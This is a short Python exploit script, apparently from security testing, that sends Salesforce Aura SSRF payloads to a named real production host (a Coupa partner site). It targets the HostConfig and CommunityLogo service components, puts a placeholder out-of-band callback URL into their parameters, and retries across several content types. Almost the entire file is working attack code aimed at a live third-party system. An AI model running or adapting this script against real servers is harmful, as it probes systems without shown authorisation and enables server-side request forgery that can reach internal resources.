#!/usr/bin/env python3
"""Exploit Salesforce Aura SSRF"""
import requests
import json

# The confirmed callback URL from the tool output
target = "https://partnerxchange.coupa.com/s/sfsites/aura"

# The fuzzer likely used various payload patterns
payloads = [
    # HostConfig SSRF
    {
        "actions": [{
            "id": "1",
            "descriptor": "serviceComponent://ui.force.components.controllers.hostConfig.HostConfig.getConfigData",
            "callingDescriptor": "UNKNOWN",
            "params": {"url": "http://YOUR-OAST-URL/metadata-test"}
        }]
    },
    # CommunityLogo SSRF  
    {
        "actions": [{
            "id": "2", 
            "descriptor": "serviceComponent://ui.communities.components.applauncher.CommunityLogo.getLogoURL",
            "callingDescriptor": "UNKNOWN",
            "params": {"logoUrl": "http://YOUR-OAST-URL/logo-test"}
        }]
    },
    # Alternative format (GET params that worked for the tool)
]

for payload in payloads:
    # Try POST with different content types
    for ct in [
        "application/x-www-form-urlencoded; charset=UTF-8",
        "application/json",
        "text/plain; charset=UTF-8"
    ]:
        try:
            r = requests.post(
                f"{target}?r=1&aura.AuraAction.execute=1",
                headers={
                    "Content-Type": ct,
                    "X-User-Agent": "Salesforce/1.0",
                    "Accept": "*/*"
                },
                data="message=" + json.dumps(payload) if "urlencoded" in ct else json.dumps(payload),
                timeout=10
            )
            print(f"[{ct}] Status: {r.status_code}, Size: {len(r.text)}")
        except Exception as e:
            print(f"[{ct}] Error: {e}")
